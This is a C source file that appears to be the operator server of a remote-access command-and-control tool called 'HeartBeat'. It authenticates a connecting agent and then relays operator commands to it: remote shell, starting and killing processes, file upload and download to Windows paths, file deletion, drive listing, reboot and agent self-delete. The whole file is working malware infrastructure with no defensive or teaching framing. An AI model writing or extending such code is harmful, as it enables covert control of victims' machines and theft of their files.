#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <libgen.h>
#include "c2_modules.h"

#define BUFFER_SIZE 2048
#define PORT_NO 1234

int main(void){
	
	
	//server hello msg
	//char server_message[500]="[+] YOU ARE CONNECTED TO THE SERVER\n";
	
	
	
	
	char server_ip[]="0.0.0.0";

	//create a socket
	//AF_INET ==> comms with ipv4
	//SOCK_STREAM ==> TCP
	//0 ==> IP protocol
	int server_socket=socket(AF_INET,SOCK_STREAM,0);
	if (server_socket == -1){
		perror("[x] socket() failed\n[x]exiting...\n");
		return -1;

	}
	int yes = 1;
	setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));

	//declare a pointer to sockaddr_in struct and allocate memory for it
	struct sockaddr_in *server_address = malloc(sizeof(struct sockaddr_in));

	server_address->sin_family=AF_INET;
	server_address->sin_port=htons(PORT_NO); //htons ==> convert port no. to network byte order
	
	//inet_pton ==> convert ip addr from string to binary, st0oring it in sin_addr
	if(inet_pton(AF_INET,server_ip,&(server_address->sin_addr)) <= 0){
		perror("[x] inet_pton() failed\n[x]exiting...\n");
		exit(EXIT_FAILURE);
	}
	
	//binding process
	if ( bind(server_socket,(struct sockaddr *)server_address,sizeof(*server_address)) != 0){
		perror("[x] bind() failed\n[x]exiting...\n");
		exit(EXIT_FAILURE);
	}

	//listening for connections
	if ( listen(server_socket, 10) != 0){
		perror("[x] listen() failed\n[x]exiting...\n");
		exit(EXIT_FAILURE);
	}
	printf("[+] listening on port %d...\n",PORT_NO);
	printf("HeartBeat> ");

	int client_socket = 0;
	struct sockaddr_in *peer_address = malloc(sizeof(struct sockaddr_in));
	socklen_t peer_addr_len = sizeof(*peer_address);
ACCEPT:
	while (1){
	//accepting connections
		client_socket=accept(server_socket, (struct sockaddr *)peer_address, (socklen_t *) &peer_addr_len);
		if (client_socket == -1){
			perror("[x] accept() failed\n[x]exiting...\n");
			exit(EXIT_FAILURE);
		}

		char peer_ip[BUFFER_SIZE];
		inet_ntop(AF_INET,&(peer_address->sin_addr), peer_ip,sizeof(peer_ip));
		printf("\n[+] connection received from %s...\n",peer_ip);
		//recv msg from agent
		// should recv basic sysinfo with password to complete auth
		char recv_buf[BUFFER_SIZE] = {0};
		ssize_t bytes_received = recv(client_socket,recv_buf,BUFFER_SIZE-1,0);
		if (bytes_received < 0){perror("[x] recv() failed\n");exit(EXIT_FAILURE);}

		//printf("[+] agent says: %s\n",recv_buf);	//debug
		

		decrypt((unsigned char *)recv_buf,(size_t) bytes_received);
		if ( AuthClient(recv_buf) != 0 ){
			// maybe you can close that unauthenticated connection and keep listening
			close(client_socket);
		}
		else {break;}
		
	}
	//printf("[+] goin to second loop\n");
	ssize_t sent_bytes = 0;
	ssize_t bytes_received = 0;
	char cmd[BUFFER_SIZE] = {0};
	
	while (1){
		//recv msg from agent
		// should recv basic sysinfo with password to complete auth
		printf("HeartBeat> ");
		fgets(cmd,BUFFER_SIZE,stdin);
		cmd[strcspn(cmd, "\n")] = '\0';

		if ( strcmp(cmd,"help") == 0){
			PrintHelp();
			continue;
		}
		else if ( strcmp(cmd,"lspid") == 0){
			printf("going to Handle func\n");
			HandleLspid(cmd,client_socket);
			continue;
		}
		else if ( strcmp(cmd,"shell") == 0){
			printf("going to Handle func\n");
			HandleShell(cmd,client_socket);
			continue;
		}
		else if (strncmp(cmd,"run",3) == 0){
			printf("going to Handle func\n");
			HandleStartProcess(cmd,client_socket);
			continue;
		}
		else if ( strncmp(cmd,"terminate",9) == 0){
			printf("going to Handle func\n");
			HandleStopProcess(cmd,client_socket);
			continue;
		}
		else if ( strncmp(cmd,"upload",6) == 0){	//uploading should have two arguments : the local file and the desired folder
			printf("going to Handle func\n");
			// Parse the buffer
			char cmd_copy[BUFFER_SIZE];
			strcpy(cmd_copy,cmd);
			char* space_pos_upload = strchr(cmd_copy, ' ');
			if (space_pos_upload == NULL) {
				continue;
			}
			//printf("[+] cmd = %s\ncmd_copy=%s\n", cmd, cmd_copy);		//DEBUG
			// 
			// will use basename() to get the filename to write with linux fs bullshit

			char remainder_copy[1024];
			strcpy(remainder_copy, space_pos_upload + 1);
			

			// First token is the filename
			char * FileNameToUpload  = basename(strtok(remainder_copy, " "));
			if (FileNameToUpload == NULL) {
			    printf("[x] Missing filename\n");
			    continue;
			}

			// Second token is the Windows path
			char* FullWindowsPath = strtok(NULL, "\0");  // Get everything until newline
			if (FullWindowsPath == NULL) {
			    printf("[x] Missing Windows path\n");
			    continue;
			}



			printf("[+] The file with basename() is %s\n",FileNameToUpload);
			printf("[+] The folder to download into is %s\n",FullWindowsPath);
			UploadFile(cmd,client_socket,FileNameToUpload,FullWindowsPath);		//Server will send, agent will receive
			continue;
		}
		else if ( strncmp(cmd,"download",8) == 0){
			printf("going to Handle func\n");
			// Parse the buffer
			char* space_pos_download = strchr(cmd, ' ');
			if (space_pos_download == NULL) {
				continue;
			}
			char remainder_copy[1024];
			strcpy(remainder_copy, space_pos_download + 1);
			// First token is the filename
			char * FileNameToDownload  = strtok(remainder_copy, " ");
			if (FileNameToDownload == NULL) {
			    printf("[x] Missing filename\n");
			    continue;
			}

			// Second token is the Windows path
			char* SavePath = strtok(NULL, "\0");  // Get everything until newline
			if (SavePath == NULL) {
			    printf("[x] Missing linux path\n");
			    continue;
			}
			//printf("[+] THE file to be downloaded is %s\n", space_pos_download + 1);		//DEBUG
			// 
			// will use basename() to get the filename to write with linux fs bullshit
			//char * FileNameToDownload = space_pos_download + 1;

			printf("[+] The file to be downloaded is %s\n",FileNameToDownload);
			printf("[+] The folder to be downloaded to is %s\n",SavePath);
			DownloadFile(cmd,client_socket,FileNameToDownload,SavePath);	//Server will receive, agent will send
			continue;
		}

		else if ( strncmp(cmd,"delete",6) == 0){
			
			// Parse the buffer
			char cmd_copy[BUFFER_SIZE];
			strcpy(cmd_copy,cmd);
			char* space_pos_delete = strchr(cmd_copy, ' ');
			if (space_pos_delete == NULL) {
				continue;
			}
			//printf("[+] cmd = %s\ncmd_copy=%s\n", cmd, cmd_copy);		//DEBUG

			char remainder_copy[1024];
			strcpy(remainder_copy, space_pos_delete + 1);

			// First token is the filename
			char * FileNameToDelete = remainder_copy;
			if (FileNameToDelete == NULL) {
			    perror("[x] Missing filename");
			    continue;
			}
			//printf("[+] File to delete will be %s\n",FileNameToDelete);	//DEBUG
			HandleDelete(cmd, client_socket, FileNameToDelete);
			continue;
		}

		else if (strcmp(cmd , "list drives") == 0){
			printf("going to handle func\n");
			HandleListDrives(cmd, client_socket);
			continue;

		}
		else if ( strncmp(cmd,"GetDate",6) == 0){
			printf("going to handle func\n");
			// Parse the buffer
			char cmd_copy[BUFFER_SIZE];
			strcpy(cmd_copy,cmd);
			char* space_pos_delete = strchr(cmd_copy, ' ');
			if (space_pos_delete == NULL) {
				continue;
			}
			//printf("[+] cmd = %s\ncmd_copy=%s\n", cmd, cmd_copy);		//DEBUG

			char remainder_copy[1024];
			strcpy(remainder_copy, space_pos_delete + 1);

			// First token is the filename
			char * FileNameToDelete = remainder_copy;
			if (FileNameToDelete == NULL) {
			    perror("[x] Missing filename");
			    continue;
			}
			printf("[+] File to get date will be %s\n",FileNameToDelete);	//DEBUG
			HandleGetFileDate(cmd, client_socket, FileNameToDelete);
			continue;

		}
		else if (strcmp(cmd,"self-delete") == 0){
			HandleSelfDelete(cmd,client_socket);
			continue;
		}
		else if ( strcmp(cmd,"reboot") == 0){
			printf("going to Handle func\n");
			HandleReboot(cmd,client_socket);
			shutdown(client_socket,SHUT_RDWR);
			close(client_socket);
			goto ACCEPT;
		}

		else if ( strcmp(cmd,"exit") == 0){
			printf("[+] Exiting\n");
			shutdown(client_socket,SHUT_RDWR);
			close(client_socket);
			break;
			
		}
		else{
			printf("[x] Invalid Command, Type help for menu\n");
			continue;
		}

	}



	/*
	//sending msg
	printf("[+] sending hello message to client...\n");
	send(client_socket, server_message, sizeof(server_message),0);
	printf("[+] message sent...\n");
	
	//close connectiion
	printf("[+] closing connection...\n");
	close(server_socket);
	printf("[+] connection closed...\n");

	*/

	//free memory
	free(server_address);
	free(peer_address);
	close(client_socket);
	close(server_socket);


	return 0;
}


